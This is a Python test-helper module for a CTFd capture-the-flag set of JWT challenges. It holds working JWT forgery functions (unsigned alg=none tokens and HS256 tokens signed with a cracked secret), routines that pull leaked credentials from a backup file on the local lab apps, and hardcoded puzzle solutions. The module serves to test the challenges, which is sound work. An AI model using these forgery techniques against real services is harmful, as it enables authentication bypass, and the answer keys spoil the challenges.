"""Shared helpers for the API and UI tests.

Challenge metadata (titles, values, flags) is read from each challenge's
challenge.yml, so the tests check the same values CTFd is given.
"""

import base64
import hashlib
import hmac
import json
import os
import re
from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parents[1]

# Local ports used by `docker run -p 500X:500X` (see README).
DEFAULT_URLS = {
    'jwt-1': 'http://localhost:5001',
    'jwt-2': 'http://localhost:5002',
    'jwt-3': 'http://localhost:5003',
    'server': 'http://localhost:5004',
}

JWT_APPS = ['jwt-1', 'jwt-2', 'jwt-3']
ALL_APPS = JWT_APPS + ['server']

# Puzzle solutions. These are the values the challenge expects players to find.
JWT2_USER = ('developer', 'dev2024!')
JWT2_SECRET = 'ronaldo7'
JWT3_USER = ('analyst', 'sec@2024')


def app_url(app):
    env_name = f"{app.replace('-', '').upper()}_URL"
    return os.getenv(env_name, DEFAULT_URLS[app]).rstrip('/')


def challenge_config(app):
    """Return title, value and flags from challenges/<app>/challenge.yml."""
    data = yaml.safe_load((ROOT / 'challenges' / app / 'challenge.yml').read_text())
    return {
        'title': data['name'],
        'value': data['value'],
        'flags': data['flags'],
    }


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')


def b64url_json(obj) -> str:
    return b64url(json.dumps(obj).encode('utf-8'))


def forge_none(payload: dict) -> str:
    """Unsigned token with alg=none (challenge 1)."""
    return f"{b64url_json({'alg': 'none', 'typ': 'JWT'})}.{b64url_json(payload)}."


def forge_hs256(payload: dict, secret: str) -> str:
    """HS256 token signed with `secret` (challenges 2 and 3)."""
    head = b64url_json({'alg': 'HS256', 'typ': 'JWT'})
    body = b64url_json(payload)
    sig = hmac.new(secret.encode('utf-8'), f'{head}.{body}'.encode('utf-8'), hashlib.sha256).digest()
    return f'{head}.{body}.{b64url(sig)}'


def bearer(token: str) -> dict:
    return {'Authorization': f'Bearer {token}'}


def jwt1_guest_creds(base_url: str):
    """Challenge 1 leaks the guest account in /backup/creds.bak (linked from robots.txt)."""
    import requests

    text = requests.get(f'{base_url}/backup/creds.bak', timeout=10).text
    user = re.search(r'# username: (.+)', text).group(1).strip()
    password = re.search(r'# password: (.+)', text).group(1).strip()
    return user, password


def server_guest_creds(base_url: str):
    """Server challenge leaks base64("user:password") in /backup/creds.bak."""
    import requests

    encoded = requests.get(f'{base_url}/backup/creds.bak', timeout=10).text.strip().splitlines()[-1]
    user, password = base64.b64decode(encoded).decode('utf-8').split(':', 1)
    return user, password


def nonce_from(html: str) -> str:
    """CTFd forms carry a hidden nonce; the attribute order differs between pages."""
    match = re.search(r'name="nonce" type="hidden" value="([0-9a-f]+)"', html) or re.search(
        r'value="([0-9a-f]+)"[^>]*name="nonce"', html
    )
    if not match:
        raise AssertionError('CTFd nonce not found in page')
    return match.group(1)


def flag_in(text: str) -> str:
    match = re.search(r'FLAG\{[^}]+\}', text)
    if not match:
        raise AssertionError(f'no flag found in: {text!r}')
    return match.group(0)
